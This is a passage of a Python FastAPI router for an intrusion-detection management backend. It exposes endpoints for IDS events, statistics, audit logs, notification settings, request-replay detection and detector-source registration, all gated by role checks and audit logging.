"""IDS management API for review, reporting, and security-center workflows."""
from __future__ import annotations

import ast
from collections import Counter, defaultdict
from datetime import datetime, timedelta
import hashlib
import json
import logging
import re
from typing import Any

from fastapi import APIRouter, Depends, HTTPException, Query, Request
from fastapi.responses import JSONResponse
from pydantic import BaseModel, Field
from sqlalchemy import func
from sqlalchemy.orm import Session

from ..api.deps import IntegrationPrincipal, require_roles, require_roles_or_integration
from ..config import settings
from ..database import get_db
from ..models.audit_log import AuditLog
from ..models.ids_event import IDSEvent
from ..models.ids_source import IDSSource, IDSSourceSyncAttempt
from ..models.ids_source_package import IDSSourcePackageActivation, IDSSourcePackageIntake
from ..models.user import User
from ..services.audit import write_audit_log
from ..services.ids_ai_analysis import is_llm_available, run_ai_analysis_sync
from ..services.ids_blocklist import add_blocked_ip, remove_blocked_ip
from ..services.ids_engine import (
    block_ip_windows,
    refresh_runtime_rule_cache,
    scan_frontend_route_probe,
    scan_request_detailed,
    unblock_ip_windows,
)
from ..services.ids_ingestion import (
    DEMO_EVENT_ORIGIN,
    REAL_EVENT_ORIGIN,
    SOURCE_CUSTOM_PROJECT,
    SOURCE_EXTERNAL_MATURE,
    SOURCE_TRANSITIONAL_LOCAL,
    TEST_EVENT_ORIGIN,
    apply_source_metadata,
    build_correlation_key,
    build_event_fingerprint,
)
from ..services.ids_source_ops import (
    HEALTH_DISABLED,
    HEALTH_FAILING,
    HEALTH_HEALTHY,
    HEALTH_NEVER,
    OPERATIONAL_STATUSES,
    SOURCE_DEMO_TEST,
    SOURCE_STATUS_DISABLED,
    SOURCE_STATUS_DRAFT,
    SOURCE_STATUS_FAILING,
    SYNC_MODE_NOT_APPLICABLE,
    SYNC_MODES,
    SYNC_STATUS_FAILED,
    SYNC_STATUS_NEVER,
    SYNC_STATUS_SKIPPED,
    SYNC_STATUS_SUCCESS,
    TRUST_CLASSIFICATIONS,
    build_source_warning,
    derive_source_health_state,
    is_trusted_production_source,
    list_recent_source_activity,
    list_recent_sync_attempts,
    normalize_source_key,
)
from ..services.ids_source_packages import (
    PACKAGE_RESULT_ACTIVATED,
    PACKAGE_RESULT_FAILED,
    PACKAGE_RESULT_PREVIEWED,
    PACKAGE_RESULT_REJECTED,
    build_package_preview_summary,
    list_latest_package_activations,
    list_recent_package_activations,
    list_recent_package_intakes,
)
from ..services.ids_operator_hub import (
    auto_dispatch_notifications_for_event,
    build_attack_heatboard,
    build_event_insight,
    dispatch_notifications,
    public_notification_settings,
    record_false_positive_learning,
    serialize_notification_event,
    save_notification_settings,
)
from ..services.ids_communication_settings import (
    load_communication_settings,
    save_communication_settings,
)
from ..services.ids_request_probe import persist_request_detection
from ..services.ids_source_sync import SourceSyncValidationError, load_source_sync_payload

router = APIRouter(prefix="/ids", tags=["ids"])
_admin = require_roles("ids_admin")
_admin_or_integration = require_roles_or_integration("ids_admin")
_ids_user = require_roles("ids_admin", "ids_operator", "ids_auditor", "ids_viewer")
logger = logging.getLogger("ids")
_SITUATION_SERVICE_STARTED_AT = datetime.utcnow()
_SAMPLE_SUBMIT_EVENT_PATH = "/api/ids/detection/sample-submit"
_TARGET_LOCATION = {"lat": 43.817, "lng": 125.3235, "city": "长春", "country": "中国", "ip": "202.198.16.1"}
_SITUATION_GEO_POINTS = [
    {"country": "美国", "city": "纽约", "lat": 40.7128, "lng": -74.0060},
    {"country": "美国", "city": "洛杉矶", "lat": 34.0522, "lng": -118.2437},
    {"country": "俄罗斯", "city": "莫斯科", "lat": 55.7558, "lng": 37.6173},
    {"country": "德国", "city": "柏林", "lat": 52.5200, "lng": 13.4050},
    {"country": "法国", "city": "巴黎", "lat": 48.8566, "lng": 2.3522},
    {"country": "英国", "city": "伦敦", "lat": 51.5074, "lng": -0.1278},
    {"country": "日本", "city": "东京", "lat": 35.6762, "lng": 139.6503},
    {"country": "韩国", "city": "首尔", "lat": 37.5665, "lng": 126.9780},
    {"country": "新加坡", "city": "新加坡", "lat": 1.3521, "lng": 103.8198},
    {"country": "澳大利亚", "city": "悉尼", "lat": -33.8688, "lng": 151.2093},
    {"country": "巴西", "city": "圣保罗", "lat": -23.5505, "lng": -46.6333},
    {"country": "加拿大", "city": "多伦多", "lat": 43.6532, "lng": -79.3832},
    {"country": "印度", "city": "新德里", "lat": 28.6139, "lng": 77.2090},
]


class ArchiveBatchRequest(BaseModel):
    event_ids: list[int] = []


class UpdateStatusRequest(BaseModel):
    status: str
    review_note: str = ""


class DemoSeedRequest(BaseModel):
    auto_analyze: bool = True


class IngestRawEvidence(BaseModel):
    method: str = ""
    path: str = ""
    query_snippet: str = ""
    body_snippet: str = ""
    user_agent: str = ""
    headers_snippet: str = ""


class IngestEventRequest(BaseModel):
    event_origin: str
    source_classification: str
    detector_family: str
    detector_name: str
    rule_id: str = ""
    rule_name: str = ""
    source_version: str = ""
    source_freshness: str = "unknown"
    occurred_at: datetime
    client_ip: str
    asset_ref: str = ""
    attack_type: str
    severity: str = "medium"
    confidence: int = Field(..., ge=0, le=100)
    event_fingerprint: str = ""
    correlation_key: str = ""
    evidence_summary: str = ""
    blocked: bool = False
    action_taken: str = ""
    response_result: str = ""
    firewall_rule: str = ""
    raw_evidence: IngestRawEvidence | None = None


class BrowserRouteProbeRequest(BaseModel):
    method: str = "GET"
    path: str
    query: str = ""
    user_agent: str = ""
    headers: dict[str, str] = Field(default_factory=dict)


class RequestDetectRequest(BaseModel):
    method: str = "GET"
    path: str = "/"
    query: str = ""
    body: str = ""
    user_agent: str = ""
    client_ip: str = ""
    headers: dict[str, str] = Field(default_factory=dict)


class SourceRegistryRequest(BaseModel):
    source_key: str
    display_name: str
    trust_classification: str
    detector_family: str
    operational_status: str = "enabled"
    freshness_target_hours: int = Field(..., ge=1, le=720)
    sync_mode: str = "manual"
    sync_endpoint: str = ""
    provenance_note: str = ""


class SourceSyncRequest(BaseModel):
    triggered_by: str
    reason: str = ""


class SourcePackagePreviewRequest(BaseModel):
    source_key: str
    package_version: str
    release_timestamp: datetime | None = None
    trust_classification: str
    detector_family: str
    provenance_note: str = ""
    triggered_by: str


class SourcePackageActivationRequest(BaseModel):
    package_intake_id: int
    triggered_by: str
    activation_note: str = ""


class NotificationEmailSettingsRequest(BaseModel):
    enabled: bool = False
    smtp_host: str = ""
    smtp_port: int = Field(465, ge=1, le=65535)
    username: str = ""
    password: str = ""
    from_addr: str = ""
    to_addrs: str = ""
    use_tls: bool = False
    use_ssl: bool = True


class NotificationWeComSettingsRequest(BaseModel):
    enabled: bool = False
    webhook_url: str = ""


class NotificationWebhookSettingsRequest(BaseModel):
    enabled: bool = False
    url: str = ""
    secret: str = ""


class NotificationSettingsRequest(BaseModel):
    email: NotificationEmailSettingsRequest = Field(default_factory=NotificationEmailSettingsRequest)
    wecom: NotificationWeComSettingsRequest = Field(default_factory=NotificationWeComSettingsRequest)
    webhook: NotificationWebhookSettingsRequest = Field(default_factory=NotificationWebhookSettingsRequest)


class CommunicationRealSettingsRequest(BaseModel):
    gateway_port: int = Field(8188, ge=1, le=65535)
    frontend_ip: str = ""
    frontend_port: int = Field(5173, ge=1, le=65535)
    backend_ip: str = ""
    backend_port: int = Field(8166, ge=1, le=65535)
    default_site_key: str = "campus_supply_chain"
    default_site_name: str = "校园供应链"
    extra_port_sites: list["CommunicationPortSiteRequest"] = Field(default_factory=list)
    host_sites: list["CommunicationHostSiteRequest"] = Field(default_factory=list)


class CommunicationPortSiteRequest(BaseModel):
    site_key: str = ""
    display_name: str = ""
    ingress_port: int = Field(8288, ge=1, le=65535)
    frontend_upstream: str = ""
    backend_upstream: str = ""


class CommunicationHostSiteRequest(BaseModel):
    site_key: str = ""
    display_name: str = ""
    hosts: list[str] = Field(default_factory=list)
    frontend_upstream: str = ""
    backend_upstream: str = ""


class CommunicationDisplaySettingsRequest(BaseModel):
    site_label: str = ""
    domain_code: str = ""
    link_template: str = ""
    routing_profile: str = ""
    packet_profile: str = ""
    signal_band: str = ""
    coordination_group: str = ""
    display_mode: str = ""
    session_track_mode: str = ""
    trace_color_mode: str = ""
    link_sync_clock: str = ""
    relay_group: str = ""
    auto_rotate: bool = True
    popup_broadcast: bool = True
    packet_shadow: bool = True
    link_keepalive: bool = True


class CommunicationSettingsRequest(BaseModel):
    real: CommunicationRealSettingsRequest = Field(default_factory=CommunicationRealSettingsRequest)
    display: CommunicationDisplaySettingsRequest = Field(default_factory=CommunicationDisplaySettingsRequest)


class NotificationDispatchRequest(BaseModel):
    event_id: int | None = None


_IDS_AUDIT_SEVERITY = {
    "ids_upload_release": "informational",
    "ids_upload_quarantine": "critical",
    "ids_upload_rejected": "critical",
    "ids_sandbox_analyze": "suspicious",
    "ids_sandbox_delete": "critical",
    "ids_source_create": "informational",
    "ids_source_update": "suspicious",
    "ids_source_sync": "suspicious",
    "ids_package_preview": "informational",
    "ids_package_activate": "critical",
    "ids_event_archive": "informational",
    "ids_event_archive_batch": "informational",
    "ids_event_ai_analyze": "suspicious",
    "ids_event_status_update": "suspicious",
    "ids_event_block": "critical",
    "ids_event_unblock": "critical",
    "ids_browser_route_block": "critical",
    "ids_false_positive_learn": "informational",
    "ids_notification_settings_update": "informational",
    "ids_communication_settings_update": "informational",
    "ids_notification_dispatch": "informational",
    "ids_notification_dispatch_auto": "informational",
    "ids_event_ingest": "informational",
}


def _ids_audit_user_name(user: User | IntegrationPrincipal) -> str:
    if isinstance(user, IntegrationPrincipal):
        return (user.source_system or user.subject or "site-integration").strip()[:64]
    return (user.real_name or user.username or "ids_admin").strip()[:64]


def _log_ids_audit(
    db: Session,
    *,
    user: User | IntegrationPrincipal,
    action: str,
    target_type: str,
    target_id: str,
    detail: str,
) -> None:
    if isinstance(user, IntegrationPrincipal):
        user_id = None
        user_role = user.role
    else:
        user_id = user.id
        user_role = (user.role or "").strip()[:64]
    write_audit_log(
        db,
        user_id=user_id,
        user_name=_ids_audit_user_name(user),
        user_role=user_role,
        action=action,
        target_type=target_type,
        target_id=str(target_id or ""),
        detail=detail,
    )


def _request_ip(request: Request) -> str:
    for header in ("x-forwarded-for", "x-real-ip", "cf-connecting-ip"):
        value = request.headers.get(header)
        if value:
            return value.split(",")[0].strip()
    if request.client:
        return request.client.host or "0.0.0.0"
    return "0.0.0.0"


def _build_ip_action_result(
    *,
    action: str,
    client_ip: str,
    app_ok: bool,
    app_message: str,
    firewall_ok: bool,
    firewall_message: str,
) -> dict[str, Any]:
    detail_parts = [f"app={app_message}"]
    if firewall_message:
        detail_parts.append(f"firewall={firewall_message}")
    detail = " | ".join(detail_parts)[:1000]

    if action == "block":
        if app_ok and firewall_ok:
            message = f"IP {client_ip} 已封禁，应用层与 Windows 防火墙均已生效"
        elif app_ok:
            message = f"IP {client_ip} 已封禁，应用层已生效；Windows 防火墙未同步成功：{firewall_message}"
        elif firewall_ok:
            message = f"IP {client_ip} 已由 Windows 防火墙封禁，但应用层名单写入失败：{app_message}"
        else:
            message = f"IP {client_ip} 封禁失败：{app_message}"
    else:
        if app_ok and firewall_ok:
            message = f"IP {client_ip} 已解除封禁，应用层与 Windows 防火墙均已恢复"
        elif app_ok:
            message = f"IP {client_ip} 已从应用层解封；Windows 防火墙返回：{firewall_message}"
        elif firewall_ok:
            message = f"IP {client_ip} 已从 Windows 防火墙解封，但应用层名单更新失败：{app_message}"
        else:
            message = f"IP {client_ip} 解封失败：{app_message}"

    return {
        "ok": app_ok or firewall_ok,
        "message": message,
        "detail": detail,
    }


def _is_loopback_probe(request: Request) -> bool:
    client_ip = ((request.client.host if request.client else "") or "").strip().lower()
    return client_ip in {"127.0.0.1", "::1", "localhost"}


def _browser_route_probe_ip(request: Request, headers: dict[str, str]) -> str:
    for header in ("x-source-ip", "x-forwarded-for", "x-real-ip", "cf-connecting-ip"):
        value = str((headers or {}).get(header) or "").strip()
        if value:
            return value.split(",", 1)[0].strip()
    return _request_ip(request)


def _serialize_ids_audit_log(row: AuditLog) -> dict[str, Any]:
    severity = _IDS_AUDIT_SEVERITY.get(row.action or "", "informational")
    return {
        "id": row.id,
        "user_name": row.user_name or "",
        "user_role": row.user_role or "",
        "action": row.action or "",
        "target_type": row.target_type or "",
        "target_id": row.target_id or "",
        "detail": row.detail or "",
        "severity": severity,
        "metadata": None,
        "created_at": row.created_at.isoformat() if row.created_at else None,
    }


@router.get("/situation")
def ids_situation(
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    q = _filtered_ids_query(db, event_origin=REAL_EVENT_ORIGIN)
    total_blocked = q.filter(IDSEvent.blocked == 1).count()
    active_threats = (
        q.filter(IDSEvent.archived == 0)
        .filter(IDSEvent.status.in_(["new", "investigating"]))
        .count()
    )
    online_sources = db.query(IDSSource).count()
    rows = q.order_by(IDSEvent.created_at.desc()).limit(30).all()
    attacks = [_serialize_situation_attack(row) for row in rows]
    return {
        "generated_at": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
        "scope": REAL_EVENT_ORIGIN,
        "disclaimer": "地图位置由真实事件 IP 做稳定映射推导，仅用于态势可视化，不代表精确地理定位。",
        "target": _TARGET_LOCATION,
        "metrics": {
            "total_blocked": total_blocked,
            "active_threats": active_threats,
            "uptime_seconds": int((datetime.utcnow() - _SITUATION_SERVICE_STARTED_AT).total_seconds()),
            "online_sources": online_sources,
        },
        "attacks": attacks,
    }


@router.get("/events")
def list_ids_events(
    attack_type: str | None = Query(None),
    client_ip: str | None = Query(None),
    blocked: int | None = Query(None),
    archived: int | None = Query(None),
    status: str | None = Query(None),
    event_origin: str | None = Query(None),
    source_classification: str | None = Query(None),
    min_score: int | None = Query(None, ge=0, le=100),
    limit: int = Query(50, ge=1, le=200),
    offset: int = Query(0, ge=0),
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    q = _filtered_ids_query(
        db,
        attack_type=attack_type,
        client_ip=client_ip,
        blocked=blocked,
        archived=archived,
        status=status,
        event_origin=event_origin,
        source_classification=source_classification,
        min_score=min_score,
    ).order_by(IDSEvent.created_at.desc())

    total = q.count()
    rows = q.offset(offset).limit(limit).all()
    return {"total": total, "items": [_serialize_ids_event(row) for row in rows]}


@router.get("/events/{event_id}")
def get_ids_event(
    event_id: int,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    row = db.query(IDSEvent).filter(IDSEvent.id == event_id).first()
    if not row:
        raise HTTPException(status_code=404, detail="IDS event not found")
    return {"item": _serialize_ids_event(row, detail=True)}


@router.get("/events/{event_id}/insight")
def get_ids_event_insight(
    event_id: int,
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    row = db.query(IDSEvent).filter(IDSEvent.id == event_id).first()
    if not row:
        raise HTTPException(status_code=404, detail="IDS event not found")
    return {
        "item": _serialize_ids_event(row, detail=True),
        **build_event_insight(db, row),
    }


@router.post("/events/{event_id}/dispatch-notifications")
def dispatch_ids_event_notifications(
    event_id: int,
    db: Session = Depends(get_db),
    current_user: User = Depends(_admin),
):
    row = db.query(IDSEvent).filter(IDSEvent.id == event_id).first()
    if not row:
        raise HTTPException(status_code=404, detail="IDS event not found")
    event_payload = _serialize_ids_event(row, detail=True)
    result = dispatch_notifications(event_payload, is_test=False)
    _log_ids_audit(
        db,
        user=current_user,
        action="ids_notification_dispatch",
        target_type="ids_event",
        target_id=str(event_id),
        detail=(
            f"Dispatched IDS notifications for event {event_id}: "
            + ", ".join(
                f"{item.get('channel')}={item.get('status')}"
                for item in result.get("results", [])
            )
        )[:500],
    )
    db.commit()
    return result


@router.get("/stats")
def ids_stats(
    event_origin: str | None = Query(None),
    source_classification: str | None = Query(None),
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    q = _filtered_ids_query(
        db,
        event_origin=event_origin,
        source_classification=source_classification,
    )
    total = q.count()
    blocked_count = q.filter(IDSEvent.blocked == 1).count()
    high_risk_count = q.filter(IDSEvent.risk_score >= 70).count()
    by_type = (
        q.with_entities(IDSEvent.attack_type, func.count(IDSEvent.id).label("cnt"))
        .group_by(IDSEvent.attack_type)
        .all()
    )
    by_status = (
        q.with_entities(IDSEvent.status, func.count(IDSEvent.id).label("cnt"))
        .group_by(IDSEvent.status)
        .all()
    )
    by_origin = (
        q.with_entities(IDSEvent.event_origin, func.count(IDSEvent.id).label("cnt"))
        .group_by(IDSEvent.event_origin)
        .all()
    )
    return {
        "total": total,
        "blocked_count": blocked_count,
        "high_risk_count": high_risk_count,
        "by_type": [
            {"attack_type": attack_type, "attack_type_label": _attack_type_label(attack_type), "count": count}
            for attack_type, count in by_type
        ],
        "by_status": [{"status": status or "new", "count": count} for status, count in by_status],
        "by_origin": [{"event_origin": origin or REAL_EVENT_ORIGIN, "count": count} for origin, count in by_origin],
    }


@router.get("/stats/heatboard")
def ids_stats_heatboard(
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    return build_attack_heatboard(db)


@router.post("/browser-route-probe")
def browser_route_probe(
    payload: BrowserRouteProbeRequest,
    request: Request,
    db: Session = Depends(get_db),
):
    if not _is_loopback_probe(request):
        raise HTTPException(status_code=403, detail="browser-route probe is local-only")

    method = (payload.method or "GET").strip().upper() or "GET"
    path = (payload.path or "").strip() or "/"
    query = (payload.query or "").strip()
    headers = {str(k).strip().lower(): str(v).strip() for k, v in (payload.headers or {}).items() if str(k).strip()}
    user_agent = (payload.user_agent or headers.get("user-agent") or request.headers.get("user-agent") or "").strip()
    detection = scan_frontend_route_probe(path, query, user_agent)
    if not detection.get("matched"):
        return {"matched": False, "blocked": False}

    detection = dict(detection)
    detection["risk_score"] = max(
        int(detection.get("risk_score") or 0),
        _severity_to_risk_score("high", detection.get("confidence")),
    )
    detection["confidence"] = max(int(detection.get("confidence") or 0), 80)
    client_ip = _browser_route_probe_ip(request, headers)
    try:
        outcome = persist_request_detection(
            db,
            client_ip=client_ip,
            method=method,
            path=path,
            query=query,
            body_str="",
            headers=headers,
            user_agent=user_agent,
            detection=detection,
        )
    except Exception as exc:
        logger.warning("Browser route probe persistence failed: %s", exc)
        outcome = {
            "incident_id": None,
            "blocked": bool(int(detection.get("risk_score") or 0) >= int(settings.IDS_BLOCK_THRESHOLD)),
            "should_block": bool(int(detection.get("risk_score") or 0) >= int(settings.IDS_BLOCK_THRESHOLD)),
            "attack_type": str(detection.get("attack_type") or ""),
            "risk_score": int(detection.get("risk_score") or 0),
            "confidence": int(detection.get("confidence") or 0),
            "response_detail": "persistence_failed",
        }

    incident_id = outcome.get("incident_id")
    if incident_id:
        try:
            write_audit_log(
                db,
                user_id=None,
                user_name="browser_route_probe",
                user_role="public",
                action="ids_browser_route_block",
                target_type="browser_route",
                target_id=path[:128],
                detail=f"{method} {path}{('?' + query[:160]) if query else ''} blocked as {outcome.get('attack_type') or ''}; event_id={incident_id}",
            )
            db.commit()
        except Exception:
            db.rollback()

    payload_body = {
        "matched": True,
        "blocked": bool(outcome.get("blocked")),
        "should_block": bool(outcome.get("should_block")),
        "attack_type": str(outcome.get("attack_type") or ""),
        "risk_score": int(outcome.get("risk_score") or 0),
        "confidence": int(outcome.get("confidence") or 0),
        "incident_id": incident_id,
        "response_detail": str(outcome.get("response_detail") or ""),
    }
    if bool(outcome.get("blocked")):
        payload_body["detail"] = "Browser route blocked by IDS security policy"
        payload_body["code"] = "IDS_BROWSER_ROUTE_BLOCKED"
        return JSONResponse(status_code=403, content=payload_body)
    return payload_body


@router.post("/request-detect")
def detect_request_payload(
    payload: RequestDetectRequest,
    request: Request,
    db: Session = Depends(get_db),
    current_user: User = Depends(_ids_user),
):
    method = (payload.method or "GET").strip().upper() or "GET"
    path = (payload.path or "").strip() or "/"
    query = (payload.query or "").strip()
    body = payload.body or ""
    headers = {
        str(key).strip().lower(): str(value).strip()
        for key, value in (payload.headers or {}).items()
        if str(key).strip()
    }
    user_agent = (payload.user_agent or headers.get("user-agent") or "").strip()
    replay_source_ip = (payload.client_ip or "").strip()[:64] or _request_ip(request)

    detection = scan_request_detailed(method, path, query, body, headers, user_agent)
    if not detection.get("matched"):
        write_audit_log(
            db,
            user_id=current_user.id,
            user_name=(current_user.real_name or current_user.username or "ids_user")[:64],
            user_role=(current_user.role or "ids_operator")[:64],
            action="ids_request_detect_clean",
            target_type="request_detection_tool",
            target_id=path[:128],
            detail=f"{method} {path}{('?' + query[:160]) if query else ''} replayed in workbench and no rule was matched.",
        )
        db.commit()
        return {
            "matched": False,
            "blocked": False,
            "would_block": False,
            "attack_type": "",
            "risk_score": 0,
            "confidence": 0,
            "event_id": None,
            "detail": "No IDS rule matched this replayed request payload.",
        }

    replay_detection = dict(detection)
    replay_detection.setdefault("source_classification", SOURCE_CUSTOM_PROJECT)
    replay_detection.setdefault("detector_family", "request_replay")
    replay_detection.setdefault("detector_name", "request_detection_tool")
    replay_detection.setdefault(
        "source_rule_id",
        str(replay_detection.get("source_rule_id") or replay_detection.get("signature_matched") or "request_detection_tool"),
    )
    replay_detection.setdefault(
        "source_rule_name",
        str(replay_detection.get("source_rule_name") or replay_detection.get("attack_type") or "request_detection_tool"),
    )
    replay_detection.setdefault("source_version", "standalone-workbench")
    replay_detection.setdefault("source_freshness", "current")

    outcome = persist_request_detection(
        db,
        client_ip=replay_source_ip,
        method=method,
        path=path,
        query=query,
        body_str=body,
        headers=headers,
        user_agent=user_agent,
        detection=replay_detection,
        event_origin=TEST_EVENT_ORIGIN,
    )

    incident_id = int(outcome.get("incident_id") or 0) or None
    write_audit_log(
        db,
        user_id=current_user.id,
        user_name=(current_user.real_name or current_user.username or "ids_user")[:64],
        user_role=(current_user.role or "ids_operator")[:64],
        action="ids_request_detect_match",
        target_type="request_detection_tool",
        target_id=str(incident_id or path[:128]),
        detail=(
            f"{method} {path}{('?' + query[:160]) if query else ''} replayed in workbench; "
            f"attack_type={outcome.get('attack_type') or ''}; risk={int(outcome.get('risk_score') or 0)}; "
            f"event_id={incident_id or '-'}."
        ),
    )
    db.commit()

    return {
        "matched": True,
        "blocked": bool(outcome.get("blocked")),
        "would_block": bool(outcome.get("should_block")),
        "attack_type": str(outcome.get("attack_type") or ""),
        "risk_score": int(outcome.get("risk_score") or 0),
        "confidence": int(outcome.get("confidence") or 0),
        "event_id": incident_id,
        "detail": str(outcome.get("response_detail") or ""),
    }


@router.get("/stats/trend")
def ids_stats_trend(
    days: int = Query(7, ge=1, le=90),
    event_origin: str | None = Query(None),
    source_classification: str | None = Query(None),
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    start = datetime.utcnow() - timedelta(days=days)
    rows = (
        _filtered_ids_query(
            db,
            event_origin=event_origin,
            source_classification=source_classification,
        )
        .filter(IDSEvent.created_at >= start)
        .all()
    )

    by_date: dict[str, int] = defaultdict(int)
    for row in rows:
        if row.created_at:
            by_date[row.created_at.strftime("%Y-%m-%d")] += 1

    dates: list[str] = []
    counts: list[int] = []
    for idx in range(days):
        day = (datetime.utcnow() - timedelta(days=days - 1 - idx)).strftime("%Y-%m-%d")
        dates.append(day)
        counts.append(by_date.get(day, 0))
    return {"dates": dates, "counts": counts}


@router.get("/log-audit")
def list_ids_log_audit(
    action: str | None = Query(None),
    target_type: str | None = Query(None),
    user_name: str | None = Query(None),
    severity: str | None = Query(None),
    limit: int = Query(80, ge=1, le=300),
    offset: int = Query(0, ge=0),
    db: Session = Depends(get_db),
    current_user: User = Depends(_admin),
):
    base_query = db.query(AuditLog).filter(AuditLog.action.like("ids_%")).order_by(AuditLog.created_at.desc())
    if action:
        base_query = base_query.filter(AuditLog.action == action)
    if target_type:
        base_query = base_query.filter(AuditLog.target_type == target_type)
    if user_name:
        base_query = base_query.filter(AuditLog.user_name == user_name)

    rows = base_query.limit(1200).all()
    serialized = [_serialize_ids_audit_log(row) for row in rows]
    if severity:
        serialized = [item for item in serialized if item["severity"] == severity]

    total = len(serialized)
    window = serialized[offset : offset + limit]
    severity_counts = Counter(item["severity"] for item in serialized)
    action_counts = Counter(item["action"] for item in serialized)
    target_counts = Counter(item["target_type"] for item in serialized)

    return {
        "items": window,
        "total": total,
        "summary": {
            "total": total,
            "critical": severity_counts.get("critical", 0),
            "suspicious": severity_counts.get("suspicious", 0),
            "informational": severity_counts.get("informational", 0),
            "by_action": [{"action": key, "count": count} for key, count in action_counts.most_common(8)],
            "by_target_type": [{"target_type": key, "count": count} for key, count in target_counts.most_common(8)],
        },
        "available_actions": sorted({item["action"] for item in serialized if item["action"]}),
        "available_targets": sorted({item["target_type"] for item in serialized if item["target_type"]}),
        "available_severities": ["critical", "suspicious", "informational"],
    }


@router.get("/notifications/settings")
def get_ids_notification_settings(
    db: Session = Depends(get_db),
    current_user: User = Depends(_admin),
):
    return public_notification_settings()


@router.get("/communication-settings")
def get_ids_communication_settings(
    db: Session = Depends(get_db),
    current_user: User = Depends(_admin),
):
    return load_communication_settings()


@router.put("/communication-settings")
def update_ids_communication_settings(
    req: CommunicationSettingsRequest,
    db: Session = Depends(get_db),
    current_user: User = Depends(_admin),
):
    settings_payload = save_communication_settings(req.model_dump())
    _log_ids_audit(
        db,
        user=current_user,
        action="ids_communication_settings_update",
        target_type="ids_communication_settings",
        target_id="global",
        detail="Updated IDS communication profile and gateway upstream IP/port settings.",
    )
    db.commit()
    return settings_payload


@router.put("/notifications/settings")
def update_ids_notification_settings(
    req: NotificationSettingsRequest,
    db: Session = Depends(get_db),
    current_user: User = Depends(_admin),
):
    settings_payload = save_notification_settings(req.model_dump())
    _log_ids_audit(
        db,
        user=current_user,
        action="ids_notification_settings_update",
        target_type="ids_notification_settings",
        target_id="global",
        detail="Updated IDS external notification settings.",
    )
    db.commit()
    return settings_payload


@router.post("/notifications/test")
def test_ids_notifications(
    req: NotificationDispatchRequest,
    db: Session = Depends(get_db),
    current_user: User = Depends(_admin),
):
    event_payload: dict[str, Any]
    if req.event_id:
        row = db.query(IDSEvent).filter(IDSEvent.id == req.event_id).first()
        if not row:
            raise HTTPException(status_code=404, detail="IDS event not found")
        event_payload = _serialize_ids_event(row, detail=True)
    else:
        event_payload = {
            "id": 0,
            "attack_type": "xss",
            "attack_type_label": "XSS",
            "client_ip": "192.168.0.99",
            "path": "/demo/test-notification",
            "method": "GET",
            "risk_score": 88,
            "status": "new",
            "blocked": True,
            "created_at": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
            "detector_name": "ids_notification_test",
            "response_detail": "IDS notification test payload",
        }
    result = dispatch_notifications(event_payload, is_test=True)
    _log_ids_audit(
        db,
        user=current_user,
        action="ids_notification_dispatch",
        target_type="ids_notification_test",
        target_id=str(req.event_id or "demo"),
        detail=(
            "Triggered IDS notification test: "
            + ", ".join(
                f"{item.get('channel')}={item.get('status')}"
                for item in result.get("results", [])
            )
        )[:500],
    )
    db.commit()
    return result


@router.get("/sources")
def list_ids_sources(
    db: Session = Depends(get_db),
    current_user=Depends(_admin),
):
    rows = (
        db.query(IDSSource)
        .order_by(IDSSource.updated_at.desc(), IDSSource.id.desc())
        .all()
    )
    activity_map = list_recent_source_activity(db, [row.source_key or "" for row in rows])
    attempts_map = list_recent_sync_attempts(db, [int(row.id) for row in rows])
    intake_map = list_recent_package_intakes(db, [int(row.id) for row in rows])
    activation_map = list_latest_package_activations(db, [int(row.id) for row in rows])
    items = [
        _serialize_ids_source(
            row,
            activity=activity_map.get(row.source_key or ""),
            attempts=attempts_map.get(int(row.id), []),
            package_intakes=intake_map.get(int(row.id), []),
            package_activation=activation_map.get(int(row.id)),
        )
        for row in rows
    ]
    return {"total": len(items), "items": items, "summary": _summarize_sources(items)}


@router.post("/sources")
def create_ids_source(
    req: SourceRegistryRequest,
    db: Session = Depends(get_db),
    current_user: User = Depends(_admin),
):
    payload = _validate_source_registry_request(req, db=db)
    source = IDSSource(
        source_key=payload["source_key"],
        display_name=payload["display_name"],
        trust_classification=payload["trust_classification"],
        detector_family=payload["detector_family"],
        operational_status=payload["operational_status"],
        freshness_target_hours=payload["freshness_target_hours"],
        sync_mode=payload["sync_mode"],
        sync_endpoint=payload["sync_endpoint"],
        provenance_note=payload["provenance_note"],
        last_sync_status=SYNC_STATUS_NEVER,
        last_sync_detail="Awaiting first sync.",
    )
    db.add(source)
    _log_ids_audit(
        db,
        user=current_user,
        action="ids_source_create",
        target_type="ids_source",
        target_id=payload["source_key"],
        detail=(
            f"Created IDS source {payload['display_name']} "
            f"(trust={payload['trust_classification']}, sync_mode={payload['sync_mode']})."
        ),
    )
    db.commit()
    db.refresh(source)
    return _serialize_ids_source(source, activity={}, attempts=[], package_intakes=[], package_activation=None)


@router.put("/sources/{source_id}")
def update_ids_source(
    source_id: int,
    req: SourceRegistryRequest,
    db: Session = Depends(get_db),
    current_user: User = Depends(_admin),
):
    source = _get_source_or_404(db, source_id)
    payload = _validate_source_registry_request(req, db=db, source_id=source_id)
    source.source_key = payload["source_key"]
    source.display_name = payload["display_name"]
    source.trust_classification = payload["trust_classification"]
    source.detector_family = payload["detector_family"]
    source.operational_status = payload["operational_status"]
    source.freshness_target_hours = payload["freshness_target_hours"]
    source.sync_mode = payload["sync_mode"]
    source.sync_endpoint = payload["sync_endpoint"]
    source.provenance_note = payload["provenance_note"]
    _log_ids_audit(
        db,
        user=current_user,
        action="ids_source_update",
        target_type="ids_source",
        target_id=str(source.id),
        detail=(
            f"Updated IDS source {payload['source_key']} "
            f"(trust={payload['trust_classification']}, sync_mode={payload['sync_mode']})."
        ),
    )
    db.commit()
    db.refresh(source)
    _refresh_runtime_cache_safely(reason="source update", source_key=source.source_key or "")
    activity_map = list_recent_source_activity(db, [source.source_key or ""])
    attempts_map = list_recent_sync_attempts(db, [int(source.id)])
    intake_map = list_recent_package_intakes(db, [int(source.id)])
    activation_map = list_latest_package_activations(db, [int(source.id)])
    return _serialize_ids_source(
        source,
        activity=activity_map.get(source.source_key or ""),
        attempts=attempts_map.get(int(source.id), []),
        package_intakes=intake_map.get(int(source.id), []),
